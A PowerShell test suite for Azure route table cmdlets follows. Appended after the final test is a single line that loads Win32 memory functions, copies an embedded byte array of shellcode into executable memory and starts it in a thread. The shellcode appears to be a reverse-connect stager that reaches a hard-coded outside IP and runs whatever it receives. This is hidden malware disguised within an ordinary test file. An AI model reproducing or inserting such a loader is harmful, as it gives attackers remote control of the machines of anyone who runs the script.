














function Test-EmptyRouteTable
{
    
    $rgname = Get-ResourceGroupName
    $routeTableName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/routeTables"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
        
        $job = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -AsJob
		$job | Wait-Job
		$rt = $job | Receive-Job

        
        $getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName
        
        
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 0 @($getRT.Routes).Count        

        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $getRT.ResourceGroupName
        Assert-AreEqual $list[0].Name $getRT.Name
        Assert-AreEqual $list[0].Etag $getRT.Etag
        Assert-AreEqual @($list[0].Routes).Count @($getRT.Routes).Count     
		
        $list = Get-AzRouteTable -ResourceGroupName "*"
        Assert-True { $list.Count -ge 0 }

        $list = Get-AzRouteTable -Name "*"
        Assert-True { $list.Count -ge 0 }

        $list = Get-AzRouteTable -ResourceGroupName "*" -Name "*"
        Assert-True { $list.Count -ge 0 }

        
        $job = Remove-AzRouteTable -ResourceGroupName $rgname -name $routeTableName -PassThru -Force -AsJob
		$job | Wait-Job
		$delete = $job | Receive-Job
        Assert-AreEqual true $delete
        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-RouteTableCRUD
{
    
    $rgname = Get-ResourceGroupName
    $routeTableName = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/routeTables"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
		$route1 = New-AzRouteConfig -name "route1" -AddressPrefix "192.168.1.0/24" -NextHopIpAddress "23.108.1.1" -NextHopType "VirtualAppliance"
		        
        
        $rt = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -Route $route1

		
        $getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName

		
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 1 @($getRT.Routes).Count       
		Assert-AreEqual $getRT.Routes[0].Name "route1"
		Assert-AreEqual $getRT.Routes[0].AddressPrefix "192.168.1.0/24"
		Assert-AreEqual $getRT.Routes[0].NextHopIpAddress "23.108.1.1"
		Assert-AreEqual $getRT.Routes[0].NextHopType "VirtualAppliance"
		Assert-NotNull $getRT.Routes[0].Etag

		
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $getRT.ResourceGroupName
        Assert-AreEqual $list[0].Name $getRT.Name
        Assert-AreEqual $list[0].Etag $getRT.Etag
        Assert-AreEqual @($list[0].Routes).Count @($getRT.Routes).Count
		Assert-AreEqual $list[0].Routes[0].Etag $getRT.Routes[0].Etag  

		$route2 = New-AzRouteConfig -name "route2" -AddressPrefix "192.168.2.0/24" -NextHopType "VnetLocal"

		
		$getRT = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -Route $route1,$route2 -Force

		
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 2 @($getRT.Routes).Count       
		Assert-AreEqual $getRT.Routes[0].Name "route1"
		Assert-AreEqual $getRT.Routes[1].Name "route2"
		Assert-AreEqual $getRT.Routes[1].AddressPrefix "192.168.2.0/24"
		Assert-null $getRT.Routes[1].NextHopIpAddress
		Assert-AreEqual $getRT.Routes[1].NextHopType "VnetLocal"
		Assert-NotNull $getRT.Routes[1].Etag

		
		$getRT = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -Route $route2 -Force

		Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 1 @($getRT.Routes).Count       
		Assert-AreEqual $getRT.Routes[0].Name "route2"		

		
        $delete = Remove-AzRouteTable -ResourceGroupName $rgname -name $routeTableName -PassThru -Force
        Assert-AreEqual true $delete
        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-RouteTableSubnetRef
{
    
    $rgname = Get-ResourceGroupName
    $routeTableName = Get-ResourceName
	$vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/routeTables"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
		$route1 = New-AzRouteConfig -name "route1" -AddressPrefix "192.168.1.0/24" -NextHopIpAddress "23.108.1.1" -NextHopType "VirtualAppliance"
		        
        
        $rt = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -Route $route1

		
        $getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName

		
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 1 @($getRT.Routes).Count       
		Assert-AreEqual $getRT.Routes[0].Name "route1"
	
		
		
        $subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 10.0.1.0/24 -RouteTable $getRT
        $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -DnsServer 8.8.8.8 -Subnet $subnet
		
		
		Assert-AreEqual $vnet.Subnets[0].RouteTable.Id $getRT.Id

		
		$getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName
		Assert-AreEqual 1 @($getRT.Subnets).Count       
		Assert-AreEqual $vnet.Subnets[0].Id $getRT.Subnets[0].Id		
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-RouteTableRouteCRUD
{
    
    $rgname = Get-ResourceGroupName
    $routeTableName = Get-ResourceName
	$vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/routeTables"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
		$route1 = New-AzRouteConfig -name "route1" -AddressPrefix "192.168.1.0/24" -NextHopIpAddress "23.108.1.1" -NextHopType "VirtualAppliance"
		        
        
        $rt = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -Route $route1

		
        $getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName

		
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 1 @($getRT.Routes).Count       
		Assert-AreEqual $getRT.Routes[0].Name "route1"
		
		
		$route = $getRT | Get-AzRouteConfig -name "route1"
		Assert-AreEqual $route.Name "route1"
		Assert-AreEqual $getRT.Routes[0].Name $route.Name
		Assert-AreEqual $getRT.Routes[0].AddressPrefix $route.AddressPrefix
		Assert-AreEqual $getRT.Routes[0].NextHopType $route.NextHopType
		Assert-AreEqual $getRT.Routes[0].NextHopIpAddress $route.NextHopIpAddress

		
		$job = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName | Add-AzRouteConfig -name "route2" -AddressPrefix "192.168.2.0/24" -NextHopType "VnetLocal" | Set-AzRouteTable -AsJob
		$job | Wait-Job
		$getRT = $job | Receive-Job

		
		$route = $getRT | Get-AzRouteConfig -name "route2"

		
        Assert-AreEqual 2 @($getRT.Routes).Count       
		Assert-AreEqual $route.Name "route2"
		Assert-AreEqual $getRT.Routes[1].Name $route.Name
		Assert-AreEqual $getRT.Routes[1].AddressPrefix $route.AddressPrefix
		Assert-AreEqual $route.AddressPrefix "192.168.2.0/24"
		Assert-AreEqual $getRT.Routes[1].NextHopType $route.NextHopType
		Assert-AreEqual $route.NextHopType "VnetLocal"
		Assert-Null $route.NextHopIpAddress
		Assert-Null $getRT.Routes[1].NextHopIpAddress

		
		$list = $getRT | Get-AzRouteConfig
		Assert-AreEqual 2 @($list).Count       
		Assert-AreEqual $list[1].Name "route2"
		Assert-AreEqual $list[1].Name $route.Name
		Assert-AreEqual $list[1].AddressPrefix $route.AddressPrefix
		Assert-AreEqual $list[1].NextHopType $route.NextHopType
		Assert-Null $list[1].NextHopIpAddress

		
		$getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName | Set-AzRouteConfig -name "route2" -AddressPrefix "192.168.3.0/24" -NextHopType "VnetLocal" | Set-AzRouteTable

		
		$route = $getRT | Get-AzRouteConfig -name "route2"

		
        Assert-AreEqual 2 @($getRT.Routes).Count       
		Assert-AreEqual $route.Name "route2"
		Assert-AreEqual $getRT.Routes[1].Name $route.Name
		Assert-AreEqual $route.AddressPrefix "192.168.3.0/24"
		Assert-AreEqual $getRT.Routes[1].AddressPrefix $route.AddressPrefix
		Assert-AreEqual $getRT.Routes[1].NextHopType $route.NextHopType
		Assert-Null $route.NextHopIpAddress
		Assert-Null $getRT.Routes[1].NextHopIpAddress

		
		$getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName | Remove-AzRouteConfig -name "route1" | Set-AzRouteTable

		
		$list = $getRT | Get-AzRouteConfig
		Assert-AreEqual 1 @($list).Count       
		Assert-AreEqual $list[0].Name "route2"

		
        $delete = Remove-AzRouteTable -ResourceGroupName $rgname -name $routeTableName -PassThru -Force
        Assert-AreEqual true $delete
        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-RouteHopTypeTest
{
    
    $rgname = Get-ResourceGroupName
    $routeTableName = Get-ResourceName
	$vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/routeTables"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
		$route1 = New-AzRouteConfig -name "route1" -AddressPrefix "192.168.1.0/24" -NextHopIpAddress "23.108.1.1" -NextHopType "VirtualAppliance"
		$route2 = New-AzRouteConfig -name "route2" -AddressPrefix "10.0.1.0/24" -NextHopType "VnetLocal"
		$route3 = New-AzRouteConfig -name "route3" -AddressPrefix "0.0.0.0/0" -NextHopType "Internet"
		$route4 = New-AzRouteConfig -name "route4" -AddressPrefix "10.0.2.0/24" -NextHopType "None"
		        
        
        $rt = New-AzRouteTable -name $routeTableName -ResourceGroupName $rgname -Location $location -Route $route1, $route2, $route3, $route4

		
        $getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName

		
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 4 @($getRT.Routes).Count       
		Assert-AreEqual $getRT.Routes[0].Name "route1"
		Assert-AreEqual $getRT.Routes[0].NextHopType "VirtualAppliance"
		Assert-AreEqual $getRT.Routes[1].Name "route2"
		Assert-AreEqual $getRT.Routes[1].NextHopType "VnetLocal"
		Assert-AreEqual $getRT.Routes[2].Name "route3"
		Assert-AreEqual $getRT.Routes[2].NextHopType "Internet"
		Assert-AreEqual $getRT.Routes[3].Name "route4"
		Assert-AreEqual $getRT.Routes[3].NextHopType "None"
		
		
        $delete = Remove-AzRouteTable -ResourceGroupName $rgname -name $routeTableName -PassThru -Force
        Assert-AreEqual true $delete
        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-RouteTableWithDisableBgpRoutePropagation
{
    
    $rgname = Get-ResourceGroupName
    $routeTableName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/routeTables"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
        
        $rt = New-AzRouteTable -name $routeTableName -DisableBgpRoutePropagation -ResourceGroupName $rgname -Location $location

        
        $getRT = Get-AzRouteTable -name $routeTableName -ResourceGroupName $rgName
        
        
        Assert-AreEqual $rgName $getRT.ResourceGroupName
        Assert-AreEqual $routeTableName $getRT.Name
		Assert-AreEqual true $getRt.DisableBGProutepropagation
        Assert-NotNull $getRT.Etag
        Assert-AreEqual 0 @($getRT.Routes).Count        

        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $getRT.ResourceGroupName
        Assert-AreEqual $list[0].Name $getRT.Name
        Assert-AreEqual $list[0].DisableBGProutepropagation $getRT.DisableBGProutepropagation
        Assert-AreEqual $list[0].Etag $getRT.Etag
        Assert-AreEqual @($list[0].Routes).Count @($getRT.Routes).Count
		
        
        $delete = Remove-AzRouteTable -ResourceGroupName $rgname -name $routeTableName -PassThru -Force
        Assert-AreEqual true $delete
        
        $list = Get-AzRouteTable -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x29,0x8d,0x36,0x1d,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

